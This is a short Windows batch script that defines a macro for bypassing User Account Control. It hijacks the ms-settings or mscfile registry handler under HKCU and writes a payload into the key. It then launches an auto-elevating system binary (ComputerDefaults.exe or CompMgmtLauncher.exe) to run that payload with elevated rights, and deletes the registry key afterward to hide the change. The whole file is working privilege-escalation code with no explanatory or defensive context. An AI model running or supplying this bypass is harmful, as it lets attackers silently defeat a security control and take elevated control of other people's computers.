@echo off
SETLOCAL DISABLEDELAYEDEXPANSION

::Definitions

( set LF=^
%= EMPTY =%
)
set ^"NL=^^^%LF%%LF%^%LF%%LF%^^"

::Windows Version

for /f "tokens=4-5 delims=. " %%i in ('ver') do set WIN_VER=%%i.%%j

if "%WIN_VER%" equ "10.0" (
	set "vuln=ms-settings"
	set "trigger=ComputerDefaults.exe"
) ELSE (
	set "vuln=mscfile" 
	set "trigger=CompMgmtLauncher.exe"
)
set regPath="HKCU\Software\Classes\%vuln%\shell\open\command"

::Macro

ENDLOCAL &^
set $elev=for %%a in (0 1) do if "%%a" equ "1" (%NL%
		for %%j in (!payload!) do (%NL%
			reg add %regpath% /d "%%j" /f%NL%
			reg add %regpath% /v DelegateExecute /f%NL%
			%trigger%%NL%
			reg delete "HKCU\Software\Classes\%vuln%" /f%NL%
		)%NL%
	) ELSE SETLOCAL ENABLEDELAYEDEXPANSION ^& set payload=,
